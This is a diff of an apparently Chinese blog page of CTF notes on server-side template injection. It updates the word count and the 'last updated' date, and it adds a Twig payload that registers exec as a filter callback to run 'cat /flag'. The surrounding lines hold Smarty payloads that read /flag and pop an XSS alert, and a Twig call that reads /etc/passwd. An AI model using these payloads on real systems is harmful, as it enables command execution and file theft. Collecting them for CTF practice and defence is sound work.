@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      740 字
+      757 字
     </span>
   
 
@@ -237,7 +237,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 天前
+                  本文最后更新于：25 天前
                 
               </p>
             
@@ -272,6 +272,9 @@
 &#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;
 
 &#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;
+
+/////
+&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;
 </code></pre></div>
 <h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p>
 <div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;
